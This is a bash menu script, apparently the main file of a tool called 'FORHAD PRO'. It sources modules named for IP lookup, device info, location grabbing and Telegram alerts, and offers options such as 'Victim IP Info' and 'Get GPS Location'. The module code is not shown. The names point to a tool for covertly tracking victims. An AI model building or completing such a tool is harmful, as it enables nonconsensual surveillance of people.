#!/bin/bash
# FORHAD PRO Main Script

source modules/banner.sh
source modules/ip_info.sh
source modules/device_info.sh
source modules/location_grabber.sh
source modules/telegram_alert.sh

while true; do
  echo -e "\nSelect an option:"
  echo "1. Victim IP Info"
  echo "2. Device Info"
  echo "3. Get GPS Location"
  echo "4. Exit"
  read -p "Choice: " choice

  case $choice in
    1) get_ip_info ;;
    2) get_device_info ;;
    3) grab_location ;;
    4) echo "Goodbye!"; exit ;;
    *) echo "Invalid choice!" ;;
  esac
done
